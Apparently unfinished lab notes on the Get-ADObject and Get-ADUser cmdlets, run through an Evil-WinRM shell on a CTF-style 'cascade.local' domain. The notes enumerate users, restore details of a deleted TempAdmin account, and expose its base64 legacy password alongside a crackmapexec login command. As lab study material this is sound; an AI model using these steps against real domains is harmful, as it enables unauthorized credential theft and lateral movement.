# Get-ADObject

> The PowerShell command Get-ADObject is part of the Active Directory PowerShell module and can be used to search for Active Directory objects. 

- [List all users](#list-all-users-in-active-directory-using-the-get-adobject-cmdlet)
- [Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects](#get-adobject--filter-isdeleted--eq-true--and-name--ne-deleted-objects--includedeletedobjects)
- [Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *](#get-adobject--filter--samaccountname--eq-tempadmin---includedeletedobjects--property)
- [cme smb $ip -u TempAdmin -p YmFDVDNyMWFOMDBkbGVz](#cme-smb-ip--u-tempadmin--p-ymfdvdnymwfomdbkbgvz)

-----------------------------------------------------

### List all users in Active Directory using the "Get-ADObject" cmdlet
Get-ADObject -Filter {objectClass -eq "user"}
Warning, might be big, better pipe it

Get-ADObject: This cmdlet is used to retrieve Active Directory objects.
-Filter: This parameter is used to specify the filter criteria for the objects you want to retrieve.
{objectClass -eq "user"}: This is a script block defining the filter criteria. It filters objects where the objectClass attribute is equal to "user."

```sh
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Filter {objectClass -eq "user"}

DistinguishedName                                           Name              ObjectClass ObjectGUID
-----------------                                           ----              ----------- ----------
CN=Administrator,CN=Users,DC=cascade,DC=local               Administrator     user        8457e8df-3e35-4ee9-90eb-1bafdae97968
CN=CascGuest,CN=Users,DC=cascade,DC=local                   CascGuest         user        fa57b12e-01a8-41ba-a399-5f9914006b67
CN=CASC-DC1,OU=Domain Controllers,DC=cascade,DC=local       CASC-DC1          computer    e3543163-68a2-40f7-a214-29877d92d539
CN=krbtgt,CN=Users,DC=cascade,DC=local                      krbtgt            user        4b348298-614d-4966-975d-9b2a51c45cd5
CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local    ArkSvc            user        e4e3b510-4558-495d-abda-d02aa6769334
CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local           Steve Smith       user        38ebd9df-c4f7-4d00-9a9f-f503432ffa7d
CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local         Ryan Thompson     user        ea43fa2d-e0a9-4b52-a913-2f5b1570418c
CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local      Util              user        6720d019-8f36-4ef0-92ec-2cee20ff2c6a
CN=James Wakefield,OU=Users,OU=UK,DC=cascade,DC=local       James Wakefield   user        1fff25e9-9ff4-43e5-a40b-c2236c88a2ec
CN=Stephanie Hickson,OU=Users,OU=UK,DC=cascade,DC=local     Stephanie Hickson user        029b21ac-fb24-40af-a23b-32b02cf6bc35
CN=John Goodhand,OU=Users,OU=UK,DC=cascade,DC=local         John Goodhand     user        5a0230ed-440a-4afe-a530-7468b77260a5
CN=Adrian Turnbull,OU=Users,OU=UK,DC=cascade,DC=local       Adrian Turnbull   user        5f6c483e-cab1-42d1-9515-dc2a1535ab9d
CN=Edward Crowe,OU=Users,OU=UK,DC=cascade,DC=local          Edward Crowe      user        727b90b2-1a2a-478a-b5d4-2f8136dfe856
CN=Ben Hanson,OU=Users,OU=UK,DC=cascade,DC=local            Ben Hanson        user        f8bd246a-cdea-4e60-9426-7afcc2e0691e
CN=David Burman,OU=Users,OU=UK,DC=cascade,DC=local          David Burman      user        c297a952-2509-48ff-b2d7-83f5db5f8dec
CN=BackupSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local BackupSvc         user        c69507fc-58f6-4427-b8c6-ed915cac7e28
CN=Joseph Allen,OU=Users,OU=UK,DC=cascade,DC=local          Joseph Allen      user        55e8431c-6e62-416e-9ddc-9db900219a44
CN=Ian Croft,OU=Users,OU=UK,DC=cascade,DC=local             Ian Croft         user        6e4e179d-1813-437e-b3cd-9b76cb9807c7
```

### Get-ADUser -Filter * -Properties *
```sh
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADUser -Filter * -Properties *
AccountExpirationDate              :
accountExpires                     : 0
AccountLockoutTime                 :
AccountNotDelegated                : False
adminCount                         : 1
AllowReversiblePasswordEncryption  : False
BadLogonCount                      : 0
badPasswordTime                    : 132569256264416583
badPwdCount                        : 0
CannotChangePassword               : False
CanonicalName                      : cascade.local/Users/Administrator
Certificates                       : {}
City                               :
CN                                 : Administrator
codePage                           : 0
Company                            :
Country                            :
countryCode                        : 0
Created                            : 1/9/2020 3:31:39 PM
createTimeStamp                    : 1/9/2020 3:31:39 PM
Deleted                            :
Department                         :
Description                        : Built-in account for administering the computer/domain
DisplayName                        :
DistinguishedName                  : CN=Administrator,CN=Users,DC=cascade,DC=local
Division                           :
DoesNotRequirePreAuth              : False
dSCorePropagationData              : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 5:59:34 PM, 1/9/2020 3:48:57 PM...}
EmailAddress                       :
EmployeeID                         :
EmployeeNumber                     :
Enabled                            : True
Fax                                :
GivenName                          :
HomeDirectory                      :
HomedirRequired                    : False
HomeDrive                          :
HomePage                           :
HomePhone                          :
Initials                           :
instanceType                       : 4
isCriticalSystemObject             : True
isDeleted                          :
LastBadPasswordAttempt             : 2/4/2021 3:20:26 PM
LastKnownParent                    :
lastLogoff                         : 0
lastLogon                          : 133399273128160564
LastLogonDate                      : 9/23/2023 8:21:32 AM
lastLogonTimestamp                 : 133399272926920210
LockedOut                          : False
logonCount                         : 231
logonHours                         : {255, 255, 255, 255...}
LogonWorkstations                  :
Manager                            :
MemberOf                           : {CN=Group Policy Creator Owners,CN=Users,DC=cascade,DC=local, CN=Domain Admins,CN=Users,DC=cascade,DC=local, CN=Enterprise Admins,CN=Users,DC=cascade,DC=local, CN=Schema Admins,CN=Users,DC=cascade,DC=local...}
MNSLogonAccount                    : False
MobilePhone                        :
Modified                           : 9/23/2023 8:21:32 AM
modifyTimeStamp                    : 9/23/2023 8:21:32 AM
msDS-User-Account-Control-Computed : 0
Name                               : Administrator
nTSecurityDescriptor               : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                     : CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
ObjectClass                        : user
ObjectGUID                         : 8457e8df-3e35-4ee9-90eb-1bafdae97968
objectSid                          : S-1-5-21-3332504370-1206983947-1165150453-500
Office                             :
OfficePhone                        :
Organization                       :
OtherName                          :
PasswordExpired                    : False
PasswordLastSet                    : 3/23/2020 8:39:41 AM
PasswordNeverExpires               : False
PasswordNotRequired                : False
POBox                              :
PostalCode                         :
PrimaryGroup                       : CN=Domain Users,CN=Users,DC=cascade,DC=local
primaryGroupID                     : 513
ProfilePath                        :
ProtectedFromAccidentalDeletion    : False
pwdLastSet                         : 132294263816630645
SamAccountName                     : administrator
sAMAccountType                     : 805306368
ScriptPath                         :
sDRightsEffective                  : 0
ServicePrincipalNames              : {}
SID                                : S-1-5-21-3332504370-1206983947-1165150453-500
SIDHistory                         : {}
SmartcardLogonRequired             : False
State                              :
StreetAddress                      :
Surname                            :
Title                              :
TrustedForDelegation               : False
TrustedToAuthForDelegation         : False
UseDESKeyOnly                      : False
userAccountControl                 : 512
userCertificate                    : {}
UserPrincipalName                  : administrator@cascade.local
uSNChanged                         : 340058
uSNCreated                         : 8196
whenChanged                        : 9/23/2023 8:21:32 AM
whenCreated                        : 1/9/2020 3:31:39 PM
[snip]
```

-Filter * retrieves all user objects because the filter is set to "wildcard" (*), which matches all users.

-Properties * retrieves all properties for each user. If you want to retrieve specific properties (e.g., Name, SamAccountName, EmailAddress), you can replace * with a comma-separated list of the properties you're interested in.

Here's an example that retrieves only the Name and SamAccountName properties for all users:

### Get-ADUser -Filter * -Properties Name, SamAccountName
```sh
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADUser -Filter * -Properties Name, SamAccountName

DistinguishedName : CN=Administrator,CN=Users,DC=cascade,DC=local
Enabled           : True
GivenName         :
Name              : Administrator
ObjectClass       : user
ObjectGUID        : 8457e8df-3e35-4ee9-90eb-1bafdae97968
SamAccountName    : administrator
SID               : S-1-5-21-3332504370-1206983947-1165150453-500
Surname           :
UserPrincipalName : administrator@cascade.local

DistinguishedName : CN=CascGuest,CN=Users,DC=cascade,DC=local
Enabled           : False
GivenName         :
Name              : CascGuest
ObjectClass       : user
ObjectGUID        : fa57b12e-01a8-41ba-a399-5f9914006b67
SamAccountName    : CascGuest
SID               : S-1-5-21-3332504370-1206983947-1165150453-501
Surname           :
UserPrincipalName : CascGuest@cascade.local

DistinguishedName : CN=krbtgt,CN=Users,DC=cascade,DC=local
Enabled           : False
GivenName         :
Name              : krbtgt
ObjectClass       : user
ObjectGUID        : 4b348298-614d-4966-975d-9b2a51c45cd5
SamAccountName    : krbtgt
SID               : S-1-5-21-3332504370-1206983947-1165150453-502
Surname           :
UserPrincipalName :
[snip]
```

### Get-ADUser -Filter * -Property SamAccountName | Select-Object -Property Name,SamAccountName
```PowerShell
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADUser -Filter * -Property SamAccountName | Select-Object -Property Name,SamAccountName

Name              SamAccountName
----              --------------
Administrator     administrator
CascGuest         CascGuest
krbtgt            krbtgt
ArkSvc            arksvc
Steve Smith       s.smith
Ryan Thompson     r.thompson
Util              util
James Wakefield   j.wakefield
Stephanie Hickson s.hickson
John Goodhand     j.goodhand
Adrian Turnbull   a.turnbull
Edward Crowe      e.crowe
Ben Hanson        b.hanson
David Burman      d.burman
BackupSvc         BackupSvc
Joseph Allen      j.allen
Ian Croft         i.croft
```

### 
```PowerShell

```

### Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```PowerShell
*Evil-WinRM* PS C:\Users\arksvc\Desktop> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects


Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059



*Evil-WinRM* PS C:\Users\arksvc\Desktop>
```

### Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
```PowerShell
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter { SAMAccountName -eq "TempAdmin" }
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM



*Evil-WinRM* PS C:\Users\arksvc\Documents>
```



### 
```PowerShell

```

### 
```PowerShell

```

### 
```PowerShell

```

### 
```PowerShell

```

### 
```PowerShell

```

### 
```PowerShell

```

### 
```PowerShell

```